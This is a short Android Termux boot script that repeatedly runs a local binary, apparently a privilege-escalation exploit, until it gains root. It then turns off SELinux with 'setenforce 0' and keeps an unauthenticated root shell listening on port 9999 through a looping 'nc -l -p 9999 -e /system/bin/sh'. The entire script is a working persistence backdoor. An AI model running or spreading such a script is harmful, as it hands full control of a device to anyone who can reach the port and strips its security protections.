#!/data/data/com.termux/files/usr/bin/bash
LOG=/data/local/tmp/root_boot.log
echo "[$(date)] Boot root starting..." >> $LOG

for ATTEMPT in $(seq 1 12); do
    for i in 0 1 2 3; do
        RESULT=$(CHEESE_ATTEMPT=$i /data/local/tmp/cheese whoami 2>/dev/null)
        if [ "$RESULT" = "root" ]; then
            echo "[$(date)] Root OK (attempt $ATTEMPT, idx $i)" >> $LOG
            CHEESE_ATTEMPT=$i /data/local/tmp/cheese sh -c '
                setenforce 0 2>/dev/null
                echo "[$(date)] Root daemon running" >> /data/local/tmp/root_boot.log
                while true; do
                    nc -l -p 9999 -e /system/bin/sh 2>/dev/null
                    sleep 1
                done
            ' &
            exit 0
        fi
    done
    echo "[$(date)] Retry $ATTEMPT failed" >> $LOG
    sleep 10
done
echo "[$(date)] All attempts failed" >> $LOG
